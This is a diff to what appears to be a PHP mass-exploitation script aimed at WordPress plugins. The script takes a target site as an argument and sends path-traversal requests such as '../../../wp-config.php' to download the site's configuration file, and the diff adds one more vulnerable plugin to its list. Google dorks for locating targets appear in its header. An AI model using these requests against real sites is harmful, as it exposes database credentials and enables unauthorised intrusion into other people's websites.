@@ -137,6 +137,10 @@
 # Vendor Homepage:: http://www.elegantthemes.com/gallery/divi/
 # Google Dork:: inurl:wp-content/themes/Divi/
 # ------------------------------------------------------------------------------
+#
+# WordPress Aspose Cloud eBook Generator File Download Vulnerability
+# Vendor Homepage:: https://wordpress.org/plugins/aspose-cloud-ebook-generator/
+# ------------------------------------------------------------------------------
 # http://i.imgur.com/45BFlNe.png
 # ===============================================================================
 
@@ -233,6 +237,8 @@ __request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=
 __request($argv[1], '/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php');
 
 __request($argv[1], '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php');
+
+__request($argv[1], '/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php');
 
 function __request($url, $plugin) {
 
